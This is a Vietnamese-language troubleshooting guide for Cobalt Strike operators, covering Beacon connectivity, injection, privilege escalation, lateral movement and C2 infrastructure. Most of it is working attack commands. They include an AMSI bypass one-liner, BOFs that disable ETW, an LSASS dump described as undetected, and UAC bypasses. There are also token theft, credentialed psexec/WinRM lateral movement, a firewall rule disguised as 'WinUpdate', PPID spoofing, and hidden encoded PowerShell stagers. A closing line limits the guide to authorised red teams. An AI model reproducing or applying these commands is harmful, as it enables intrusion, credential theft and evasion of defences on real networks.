# Cobalt Strike — Hướng Dẫn Xử Lý Sự Cố (Tiếng Việt)

> Giải pháp cho các vấn đề phổ biến của Cobalt Strike: kết nối Beacon, lỗi payload, lỗi injection và vấn đề team server.

---

## Mục Lục

1. [Beacon Không Kết Nối](#1-beacon-không-kết-nối)
2. [Beacon Ngắt Kết Nối / Chết](#2-beacon-ngắt-kết-nối--chết)
3. [Lệnh Không Trả Output](#3-lệnh-không-trả-output)
4. [Lỗi Injection / execute-assembly](#4-lỗi-injection--execute-assembly)
5. [Lỗi Leo Thang Đặc Quyền](#5-lỗi-leo-thang-đặc-quyền)
6. [Lỗi Di Chuyển Ngang](#6-lỗi-di-chuyển-ngang)
7. [Vấn Đề DNS Beacon](#7-vấn-đề-dns-beacon)
8. [Vấn Đề SMB / TCP Beacon](#8-vấn-đề-smb--tcp-beacon)
9. [Vấn Đề Team Server](#9-vấn-đề-team-server)
10. [Vấn Đề Malleable C2 Profile](#10-vấn-đề-malleable-c2-profile)
11. [Vấn Đề AV / EDR Phát Hiện](#11-vấn-đề-av--edr-phát-hiện)
12. [Thông Báo Lỗi Phổ Biến](#12-thông-báo-lỗi-phổ-biến)
13. [Lệnh Chẩn Đoán](#13-lệnh-chẩn-đoán)

---

## 1. Beacon Không Kết Nối

### Triệu Chứng
Payload được thực thi trên mục tiêu nhưng không có Beacon nào xuất hiện trong danh sách session CS.

### Các Bước Chẩn Đoán

```
Bước 1: Xác minh listener đang chạy
  Cobalt Strike → Listeners → kiểm tra trạng thái "Up"

Bước 2: Kiểm tra tường lửa team server
  # Trên team server:
  netstat -tulnp | grep :443    # hoặc port listener của bạn
  iptables -L -n | grep 443

Bước 3: Xác minh payload đúng listener
  # Tạo lại payload và xác nhận tên listener

Bước 4: Kiểm tra kết nối từ mục tiêu đến team server
  # Trên mục tiêu (qua RCE hoặc shell hiện có):
  Test-NetConnection -ComputerName <ts_ip> -Port 443

Bước 5: Kiểm tra cấu hình redirector
  # Kiểm tra redirector đang chuyển tiếp đến TS:
  curl -v -k -H "Host: your-c2-domain.com" https://redirector_ip/search
```

### Nguyên Nhân Phổ Biến & Cách Sửa

| Nguyên nhân | Cách sửa |
|---|---|
| Tường lửa chặn port 443/80 trên TS | Mở quy tắc iptables cho port C2 |
| Sai listener cho payload | Tạo lại với listener đúng |
| Payload bị AV giết trước khi thực thi | Bypass AV, hoặc dùng staging in-memory |
| Proxy mạng chặn lưu lượng C2 | Dùng DNS beacon hoặc HTTPS với profile thân thiện proxy |
| Chứng chỉ TLS không khớp (cho HTTPS) | Kiểm tra cert khớp domain trong profile |
| Redirector không chuyển tiếp URI đúng | Cập nhật quy tắc mod_rewrite để khớp URI profile |

---

## 2. Beacon Ngắt Kết Nối / Chết

### AV/EDR Giết Beacon trong Bộ Nhớ

```
# Dấu hiệu:
- Beacon kết nối rồi chết sau ~60 giây
- Beacon chết sau khi chạy mimikatz/execute-assembly
- Tất cả Beacon trên host tương tự chết cùng lúc

# Cách sửa:
1. Đặt sleep_mask "true" trong block stage của profile
2. Đặt userwx "false" để tránh bộ nhớ RWX
3. Đặt stomppe "true" và cleanup "true"
4. Dùng module stomping (module_x64 "wwanmm.dll")
5. Thay spawnto thành tiến trình đáng tin cậy hơn
```

### Tiến Trình Mục Tiêu Crash

```
# Nếu dùng inject:
- Tiến trình bạn inject vào có thể đã crash
- Kiểm tra: tiến trình còn tồn tại không? beacon> ps → tìm PID

# Phòng tránh:
- Chọn tiến trình ổn định, chạy lâu để injection
- Tránh inject tiến trình 32-bit với Beacon 64-bit
```

### Sleep Quá Dài / Ngắt Kết Nối Giả

```
# CS hiển thị "Not Responding" nhưng Beacon vẫn sống
# Điều này bình thường nếu sleep > ngưỡng timeout CS

# Buộc check-in ngay:
beacon> checkin

# Tăng sleep để giảm tần suất "Not Responding":
beacon> sleep 60 20    # kiên nhẫn hơn
```

---

## 3. Lệnh Không Trả Output

### Chẩn Đoán

```
# Kiểm tra jobs:
beacon> jobs
# Nếu task xuất hiện ở đây, nó vẫn đang chạy

# Tăng sleep timeout:
beacon> sleep 0
# Chạy lại lệnh
```

### Tiến Trình Fork&Run Bị Giết Trước Khi Output Trả Về

```
# Triệu chứng: execute-assembly chạy nhưng không có output
# Có thể: EDR giết tiến trình sacrificial trước khi output được lấy về

# Cách sửa 1: blockdlls start
beacon> blockdlls start
beacon> execute-assembly Rubeus.exe triage

# Cách sửa 2: Thay spawnto
beacon> spawnto x64 C:\Windows\System32\svchost.exe
beacon> execute-assembly Rubeus.exe triage

# Cách sửa 3: amsi_disable trong profile
post-ex { set amsi_disable "true"; }
```

---

## 4. Lỗi Injection / execute-assembly

### "Access Denied" khi inject / psinject

```
# Nguyên nhân: không đủ đặc quyền để mở tiến trình mục tiêu
# Cách sửa 1: Leo thang đặc quyền trước
beacon> getsystem

# Cách sửa 2: Chọn tiến trình trong cùng ngữ cảnh người dùng
beacon> ps    # tìm PID tiến trình chạy dưới cùng user
beacon> inject <pid_cung_user> x64 lab-https

# Cách sửa 3: Steal token từ tiến trình đặc quyền cao hơn trước
beacon> steal_token <admin_pid>
beacon> inject <target_pid> x64 lab-https
```

### Không Khớp Kiến Trúc

```
# Triệu chứng: injection thành công nhưng Beacon chết ngay
# Nguyên nhân: inject shellcode x86 vào tiến trình x64 hoặc ngược lại

# Cách sửa: khớp arch với tiến trình mục tiêu
beacon> ps    # kiểm tra cột Arch
beacon> inject 5120 x64 lab-https    # dùng x64 cho tiến trình 64-bit
beacon> inject 5120 x86 lab-https    # dùng x86 cho tiến trình 32-bit
```

### execute-assembly: Assembly Không Chạy / Không Có Output

```
# Nguyên nhân 1: AMSI chặn .NET assembly
# Cách sửa: bật amsi_disable trong profile, hoặc vô hiệu hóa thủ công:
beacon> powerpick [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Nguyên nhân 2: Telemetry ETW gây phát hiện
# Cách sửa: vô hiệu hóa ETW qua BOF trước khi chạy
beacon> inline-execute /opt/bofs/etw_disable.o
beacon> execute-assembly Rubeus.exe triage

# Nguyên nhân 3: Sai phiên bản .NET
# Cách sửa: kiểm tra phiên bản .NET trên mục tiêu
beacon> shell dir C:\Windows\Microsoft.NET\Framework64\

# Nguyên nhân 4: Assembly yêu cầu GUI / stdin
# Một số assembly cần input tương tác — chúng sẽ bị treo
```

---

## 5. Lỗi Leo Thang Đặc Quyền

### `getsystem` Thất Bại

```
# Nguyên nhân 1: Đã là SYSTEM
beacon> getuid    # nếu đã là NT AUTHORITY\SYSTEM, không cần nữa

# Nguyên nhân 2: UAC đang hoạt động — getsystem không bypass UAC
# Cách sửa: leo thang lên high integrity trước
beacon> elevate uac-token-duplication lab-https

# Nguyên nhân 3: Named pipe exploit bị chặn
# Cách sửa: thử kỹ thuật elevate khác
beacon> elevate uac-schtasks lab-https
```

### `elevate` Thất Bại

```
# Kỹ thuật UAC bypass có thể đã được vá:
beacon> elevate uac-token-duplication lab-https
beacon> elevate uac-schtasks lab-https
beacon> elevate uac-cmstplua lab-https    # Elevate Kit

# Kiểm tra mức integrity hiện tại:
beacon> shell whoami /groups | findstr "Level"

# Kiểm tra UAC có bật không:
beacon> reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA
```

### Elevate Kit Chưa Được Tải

```
# Exploit Elevate Kit (sweetpotato, printspoofer, v.v.) yêu cầu tải Elevate Kit
# Tải: Cobalt Strike → Script Manager → Load → elevate_kit.cna
```

---

## 6. Lỗi Di Chuyển Ngang

### `jump psexec` Thất Bại

```
# Lỗi phổ biến:
"Access denied"
"Failed to connect to target"
"Service did not start"

# Cách sửa 1: Xác minh thông tin xác thực/token
beacon> getuid
beacon> make_token CORP\admin matkhau
beacon> jump psexec dc01 lab-https

# Cách sửa 2: Kiểm tra kết nối SMB
beacon> portscan dc01 445 none 1
beacon> shell net use \\dc01\ADMIN$ /user:CORP\administrator matkhau

# Cách sửa 3: Thử kỹ thuật thay thế
beacon> jump winrm64 dc01 lab-https    # dùng WinRM nếu SMB bị chặn
```

### `jump winrm64` Thất Bại

```
# Xác minh WinRM được bật trên mục tiêu:
beacon> shell sc query winrm /s:dc01
beacon> shell netstat -an | findstr 5985    # port WinRM

# Bật WinRM trên mục tiêu (nếu có shell admin):
beacon> shell winrm quickconfig -quiet
beacon> shell Enable-PSRemoting -Force
```

---

## 7. Vấn Đề DNS Beacon

### DNS Beacon Không Kết Nối

```
# Bước 1: Xác minh DNS delegation
# Trên mục tiêu:
nslookup type1.c2.corp.com
# Nên trả về IP team server
# Nếu NXDOMAIN: DNS delegation bị hỏng

# Bước 2: Kiểm tra TS đang lắng nghe trên UDP 53
netstat -ulnp | grep :53

# Bước 3: Kiểm tra TS khởi động với IP đúng cho DNS
./teamserver <DNS_LISTENER_IP> matkhau

# Bước 4: Kiểm tra NS records
dig NS c2.corp.com @8.8.8.8    # nên trả về IP TS của bạn
```

### DNS Beacon Rất Chậm

```
# DNS vốn chậm — chỉ dùng khi không có HTTP(S)

# Tăng tốc:
beacon> mode dns-txt    # TXT records mang nhiều data hơn mỗi query
beacon> sleep 5 0       # sleep rất thấp cho DNS
```

---

## 8. Vấn Đề SMB / TCP Beacon

### SMB Beacon Không Link

```
# Bước 1: Xác minh SMB Beacon đang chạy
beacon> ps    # tìm tiến trình với beacon SMB

# Bước 2: Xác nhận tên pipe
beacon> link 10.10.10.5 \\.\pipe\mojo.5688.8052.183894939787088877##

# Bước 3: Kiểm tra named pipe tồn tại trên mục tiêu
beacon> shell dir \\.\pipe\

# Bước 4: Kiểm tra tường lửa SMB
beacon> portscan 10.10.10.5 445 none 1
```

### TCP Beacon Không Kết Nối

```
# Kiểm tra port đang mở và lắng nghe:
beacon> shell netstat -ano | findstr LISTENING | findstr 4444

# Thử kết nối:
beacon> connect 10.10.10.5 4444

# Nếu bị chặn: cần quy tắc tường lửa trên mục tiêu
beacon> shell netsh advfirewall firewall add rule name="WinUpdate" protocol=TCP dir=in localport=4444 action=allow
```

---

## 9. Vấn Đề Team Server

### Team Server Không Khởi Động

```
# Kiểm tra phiên bản Java:
java -version    # yêu cầu Java 11+

# Kiểm tra cú pháp profile:
./c2lint profile.profile

# Kiểm tra port 50050:
netstat -tulnp | grep 50050

# Chạy với output chi tiết:
./teamserver -d 192.168.1.100 matkhau
```

### Operator Không Thể Kết Nối

```
# Kiểm tra iptables:
iptables -L -n | grep 50050    # xác nhận IP operator được cho phép

# Test tường lửa từ máy operator:
nc -zv ts_ip 50050
```

---

## 10. Vấn Đề Malleable C2 Profile

### Profile Làm Team Server Crash Khi Khởi Động

```
# Chạy c2lint trước:
./c2lint myprofile.profile

# Lỗi cú pháp phổ biến:
# - Thiếu dấu chấm phẩy ở cuối câu set
# - Thiếu dấu đóng ngoặc }
# - Tên tùy chọn không hợp lệ
# - Chuỗi không được đặt trong dấu ngoặc đúng cách

# Kiểm tra với profile tối thiểu trước, rồi thêm section
```

### Beacon Kết Nối Nhưng Output Bị Sai

```
# Nguyên nhân: Thứ tự transform không khớp giữa block client/server

# Cách sửa: đảm bảo transform client và server là ngược của nhau
# Client gửi: base64url → prepend → header
# Server phân tích: trích xuất header → bỏ prepend → giải mã base64url
```

---

## 11. Vấn Đề AV / EDR Phát Hiện

### Beacon Bị Windows Defender Giết

```
# Tùy chọn bypass nhanh:

# 1. Tải Artifact Kit tùy chỉnh (cách sửa tốt nhất dài hạn)
# Build và tải: Cobalt Strike → Artifact Kit

# 2. Obfuscate với Donut + garble
donut -f beacon.exe -o beacon_donut.bin

# 3. Thêm delay sandbox vào payload stager
# Defender sandbox hết thời gian sau ~3 phút

# 4. Dùng PS stager đã encode
powershell.exe -nop -w hidden -enc <base64>

# 5. Tạo payload staged (footprint ban đầu nhỏ hơn)
```

### EDR Giết Hoạt Động Post-Ex

```
# Cách sửa:
beacon> blockdlls start                       # chặn DLL EDR load vào fork&run
beacon> spawnto x64 C:\Windows\System32\dllhost.exe
beacon> ppid 4812                              # giả mạo parent

# Để bypass AMSI:
# Trong profile: post-ex { set amsi_disable "true"; }

# Để bypass ETW:
beacon> inline-execute /opt/bofs/etw_disable.o

# Để dump LSASS không bị phát hiện:
beacon> inline-execute /opt/bofs/nanodump.o lsass 1
```

---

## 12. Thông Báo Lỗi Phổ Biến

| Lỗi | Nguyên nhân | Cách sửa |
|---|---|---|
| `Could not connect to team server` | TS tắt, IP/port sai, tường lửa | Kiểm tra TS đang chạy, iptables |
| `Beacon: Access is denied.` | Không đủ đặc quyền | Leo thang trước |
| `Beacon: The system cannot find the file specified.` | Đường dẫn file sai | Kiểm tra đường dẫn bằng `ls` |
| `Beacon: The handle is invalid.` | Handle đóng hoặc token không hợp lệ | `rev2self`, steal token lại |
| `fork&run failed` | Tiến trình spawnto không tìm thấy | Thay đổi đường dẫn `spawnto` |
| `inject failed` | Không mở được tiến trình / arch không khớp | Kiểm tra arch, đặc quyền |
| `[CS] Could not load: X` | Lỗi cú pháp Aggressor script | Kiểm tra cú pháp .cna |
| `Could not load Malleable profile` | Lỗi cú pháp profile | Chạy `c2lint` |

---

## 13. Lệnh Chẩn Đoán

### Chẩn Đoán Beacon

```
beacon> getuid                    # ngữ cảnh người dùng hiện tại
beacon> getpid                    # PID beacon
beacon> ps                       # danh sách tiến trình
beacon> jobs                     # jobs đang chờ
beacon> downloads                # download đang tiến hành
beacon> shell netstat -ano       # kết nối mạng
beacon> shell whoami /all        # thông tin token đầy đủ
```

### Chẩn Đoán Team Server

```bash
# Kiểm tra tiến trình TS
ps aux | grep teamserver
netstat -tulnp | grep -E '50050|443|80|53'

# Kiểm tra log TS
tail -f /var/log/syslog | grep cobaltstrike

# Test listener
curl -v -k https://localhost:443/

# Kiểm tra bộ nhớ
free -h
ps aux --sort=-%mem | head -20
```

### Chẩn Đoán Đường Dẫn Mạng

```
# Từ máy operator → test TS:
nc -zv teamserver_ip 50050
curl -k https://teamserver_ip/

# Từ mục tiêu → test TS (qua Beacon):
beacon> shell curl -k https://redirector_domain/
beacon> portscan teamserver_ip 443 none 1
```

---

*Cập nhật lần cuối: 2026-06-09 | Tài liệu tham khảo chỉ dành cho red team được ủy quyền.*
